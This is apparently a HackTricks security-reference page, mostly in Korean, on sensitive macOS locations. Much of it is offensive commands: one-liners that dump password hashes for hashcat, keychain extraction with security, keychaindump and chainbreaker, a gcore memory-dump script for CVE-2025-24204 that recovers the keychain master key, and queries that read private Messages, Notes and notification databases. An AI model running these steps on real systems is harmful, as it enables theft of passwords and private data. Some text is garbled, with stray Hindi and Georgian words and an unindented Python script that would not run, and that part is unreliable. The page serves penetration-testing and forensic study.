# macOS 민감한 위치 & 흥미로운 Daemons

{{#include ../../../banners/hacktricks-training.md}}

## 비밀번호

### Shadow Passwords

Shadow password는 사용자의 설정과 함께 **`/var/db/dslocal/nodes/Default/users/`**에 있는 plist에 저장된다.\
다음 oneliner를 사용해 **사용자에 대한 모든 정보**(hash 정보 포함)를 덤프할 수 있다:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.

모든 non-service 계정의 creds를 hashcat format `-m 7100` (macOS PBKDF2-SHA512)으로 dump하는 대체 one-liner는 다음과 같습니다:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
또 다른 방법으로 사용자의 `ShadowHashData`를 얻는 방법은 `dscl`를 사용하는 것이다: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

이 파일은 시스템이 **single-user mode**에서 실행될 때만 **사용된다**(따라서 자주 사용되지는 않는다).

### Keychain Dump

`security` binary를 사용하여 **dump the passwords decrypted**할 때, 여러 프롬프트가 사용자에게 이 작업을 허용할지 묻게 된다.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
On modern macOS the most interesting backing stores are usually **`~/Library/Keychains/login.keychain-db`** and **`/Library/Keychains/System.keychain`**. They are SQLite-backed files, but plaintext access is still brokered by **`securityd`**: stealing the raw DB mainly gives you metadata and encrypted blobs unless you also recover the user's password, `SystemKey`, or an in-memory master key.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.

### Keychaindump Overview

**keychaindump**라는 도구는 macOS keychain에서 passwords를 추출하기 위해 개발되었지만, [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)에서 언급된 것처럼 Big Sur 같은 최신 macOS 버전에서는 한계가 있습니다. **keychaindump**를 사용하려면 attacker가 접근 권한을 얻고 권한을 **root**까지 escalatе해야 합니다. 이 도구는 편의상 사용자가 로그인할 때 기본적으로 keychain이 잠금 해제되어 애플리케이션이 사용자의 password를 반복해서 요구하지 않고도 접근할 수 있다는 점을 악용합니다. 그러나 사용자가 매번 사용 후 keychain을 잠그도록 선택하면 **keychaindump**는 효과가 없어집니다.

**Keychaindump**는 Apple이 authorization과 cryptographic operations를 위한 daemon으로 설명하는 특정 process **securityd**를 대상으로 동작하며, keychain 접근에 핵심적입니다. 추출 과정에는 사용자의 login password에서 파생된 **Master Key**를 식별하는 작업이 포함됩니다. 이 키는 keychain file을 읽는 데 필수적입니다. **Master Key**를 찾기 위해 **keychaindump**는 `vmmap` command를 사용해 **securityd**의 memory heap을 스캔하고, `MALLOC_TINY`로 표시된 영역에서 잠재적인 키를 찾습니다. 다음 command는 이러한 memory locations를 검사하는 데 사용됩니다:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
잠재적인 master key를 식별한 후, **keychaindump**는 heaps를 검색하여 master key 후보를 나타내는 특정 패턴(`0x0000000000000018`)을 찾습니다. 이 key를 활용하려면 deobfuscation을 포함한 추가 단계가 필요하며, 이는 **keychaindump**의 source code에 설명되어 있습니다. 이 영역에 집중하는 analyst는 keychain을 decrypt하는 데 필요한 중요한 data가 **securityd** process의 memory 안에 저장된다는 점에 주목해야 합니다. **keychaindump**를 실행하는 예시 command는 다음과 같습니다:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)는 포렌식적으로 안전한 방식으로 OSX keychain에서 다음 유형의 정보를 추출하는 데 사용할 수 있습니다:

- 해시된 Keychain password, [hashcat](https://hashcat.net/hashcat/) 또는 [John the Ripper](https://www.openwall.com/john/)로 크래킹하기에 적합
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

keychain unlock password, [volafox](https://github.com/n0fate/volafox) 또는 [volatility](https://github.com/volatilityfoundation/volatility)를 사용해 얻은 master key, 또는 SystemKey 같은 unlock file이 있으면 Chainbreaker는 plaintext passwords도 제공합니다.

이러한 Keychain unlocking method 중 하나가 없으면, Chainbreaker는 사용 가능한 다른 모든 정보를 표시합니다.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey로 keychain keys(비밀번호 포함) 덤프하기**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **hash를 크랙해서 keychain 키(비밀번호 포함) 덤프하기**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **메모리 덤프로 keychain 키(비밀번호 포함) 덤프하기**

[다음 단계](../index.html#dumping-memory-with-osxpmem)를 따라 **메모리 덤프**를 수행하세요
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **사용자 비밀번호를 사용해 keychain 키(비밀번호 포함) 덤프**

사용자의 비밀번호를 알고 있다면 이를 사용해 **해당 사용자에게 속한 keychain을 덤프하고 복호화**할 수 있습니다.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement를 통한 Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia)는 `/usr/bin/gcore`에 **`com.apple.system-task-ports.read`** entitlement를 포함한 채 배포했기 때문에, 로컬 admin(또는 악성 서명 앱)이라도 **SIP/TCC가 적용된 상태에서도 어떤 프로세스 메모리든 덤프할 수 있었습니다**. `securityd`를 덤프하면 **Keychain master key**가 평문으로 leak되고, 사용자의 비밀번호 없이 `login.keychain-db`를 복호화할 수 있습니다.

**취약한 빌드(15.0–15.2)에서의 빠른 재현:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
추출한 hex key를 Chainbreaker(`--key <hex>`)에 넣어 login keychain을 decrypt한다. Apple은 **macOS 15.3+**에서 이 entitlement를 제거했으므로, 이 방법은 패치되지 않은 Sequoia 빌드나 취약한 binary를 유지한 시스템에서만 동작한다.

### kcpassword

**kcpassword** 파일은 **사용자의 login password**를 저장하는 파일이지만, 시스템 소유자가 **automatic login을 활성화한 경우에만** 해당된다. 따라서 사용자는 password를 입력하라는 요청 없이 자동으로 로그인된다(보안상 매우 좋지 않다).

password는 **`/etc/kcpassword`** 파일에 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 키와 xored되어 저장된다. 사용자의 password가 key보다 길면 key가 재사용된다.\
이 때문에 password를 매우 쉽게 복구할 수 있으며, 예를 들어 [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d) 같은 scripts를 사용할 수 있다.

## Databases에서의 흥미로운 정보

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

**Sequoia** 이전에는 보통 Notification Center 저장소를 **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**에서 찾을 수 있습니다. **Sequoia+**에서는 Apple이 이를 TCC로 보호되는 group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**로 옮겼습니다.

흥미로운 정보의 대부분은 **blob** 컬럼 안에 저장되어 있으므로, 해당 내용을 추출해 사람이 읽을 수 있는 형식으로 변환해야 합니다 (`plutil -p -`, `strings`, 또는 작은 parser). 빠른 triage 예시:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### 최근 개인정보 이슈 (NotificationCenter DB)

- macOS **14.7–15.1**에서 Apple은 배너 내용을 적절한 redaction 없이 `db2/db` SQLite에 저장했습니다. CVEs **CVE-2024-44292/44293/40838/54504**로 인해, 로컬 사용자는 DB를 열기만 해도 다른 사용자의 notification text를 읽을 수 있었습니다(TCC prompt 없음).
- Apple은 이후 DB를 `group.com.apple.usernoted`로 옮기고 최신 Sequoia 빌드에서 TCC로 보호하도록 완화했으므로, 현재 시스템에서는 보통 이를 읽기 위해 올바른 user context 또는 TCC bypass가 필요합니다.
- 레거시 endpoint에서는 artefacts를 보존하려면 업데이트하거나 재부팅하기 전에 `db`, `db-wal`, `db-shm` 파일을 함께 복사하세요.

### Notes

사용자 **notes**는 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`에서 찾을 수 있습니다
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
위의 one-liner가 너무 시끄럽다면, `ZICNOTEDATA.ZDATA`를 export하고, gunzip한 다음 protobuf를 parse하세요: 이것은 보통 SQLite에 직접 `strings`를 실행하는 것보다 더 reliable합니다.

### Background Tasks / Login Items

**Ventura** 이후로, user-approved login items와 여러 background tasks는 **BTM** stores에 추적되며, 예를 들어 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** 및 versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**가 있습니다.

이 파일들은 persistence, helper tools, 그리고 일부 MDM-managed background items를 빠르게 식별하는 데 유용합니다:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
For the persistence angle and BTM internals, check [the auto-start locations page](../../macos-auto-start-locations.md#login-items) and [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

In macOS apps preferences are located in **`$HOME/Library/Preferences`** and in iOS they are in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS the cli tool **`defaults`** can be used to **modify the Preferences file**.

**`/usr/sbin/cfprefsd`** claims the XPC services `com.apple.cfprefsd.daemon` and `com.apple.cfprefsd.agent` and can be called to perform actions such as modify preferences.

## OpenDirectory permissions.plist

The file `/System/Library/OpenDirectory/permissions.plist` contains permissions applied on node attributes and is protected by SIP.\
This file grants permissions to specific users by UUID (and not uid) so they are able to access specific sensitive information like `ShadowHashData`, `HeimdalSRPKey` and `KerberosKeys` among others:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## 시스템 알림

### Darwin Notifications

알림의 मुख्य 데몬은 **`/usr/sbin/notifyd`**입니다. 알림을 수신하려면 클라이언트는 `com.apple.system.notification_center` Mach 포트를 통해 등록해야 합니다(`sudo lsmp -p <pid notifyd>`로 확인). 이 데몬은 `/etc/notify.conf` 파일로 설정할 수 있습니다.

알림에 사용되는 이름은 고유한 reverse DNS 표기이며, 그중 하나로 알림이 전송되면 이를 처리할 수 있다고 표시한 클라이언트가 해당 알림을 수신합니다.

SIGUSR2 시그널을 notifyd 프로세스에 보내고 생성된 파일 `/var/run/notifyd_<pid>.status`를 읽으면 현재 상태를 덤프하고(모든 이름도 확인 가능) 할 수 있습니다:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

주요 바이너리가 **`/usr/sbin/distnoted`**인 **Distributed Notification Center**는 알림을 보내는 또 다른 방법입니다. 이 서비스는 일부 XPC 서비스를 노출하며, 클라이언트를 검증하려고 몇 가지 확인을 수행합니다.

### Apple Push Notifications (APN)

이 경우 애플리케이션은 **topics**에 등록할 수 있습니다. 클라이언트는 **`apsd`**를 통해 Apple 서버에 접속하여 token을 생성합니다.\
그다음 providers도 token을 생성하고, Apple 서버에 연결하여 클라이언트에게 메시지를 보낼 수 있습니다. 이러한 메시지는 로컬에서 **`apsd`**에 의해 수신되며, **`apsd`**는 이를 대기 중인 애플리케이션에 알림으로 전달합니다.

preferences는 `/Library/Preferences/com.apple.apsd.plist`에 მდებარეობს합니다.

macOS에는 `/Library/Application\ Support/ApplePushService/aps.db`에, iOS에는 `/var/mobile/Library/ApplePushService`에 메시지의 로컬 database가 있습니다. 여기에는 `incoming_messages`, `outgoing_messages`, `channel`의 3개 tables가 있습니다.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
다음을 사용하여 daemon과 connections에 대한 정보도 얻을 수 있습니다:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

이것들은 사용자가 화면에서 봐야 하는 notifications입니다:

- **`CFUserNotification`**: 이 API는 화면에 메시지가 포함된 pop-up을 표시하는 방법을 제공합니다.
- **The Bulletin Board**: 이것은 iOS에서 Notification Center에 저장되고 사라지는 배너를 표시합니다.
- **`NSUserNotificationCenter`**: 이것은 MacOS에서 iOS bulletin board입니다. 이전 macOS 릴리스에서는 database가 보통 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`에 있었고; Sequoia+에서는 `~/Library/Group Containers/group.com.apple.usernoted/db2/db`로 이동했습니다.

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
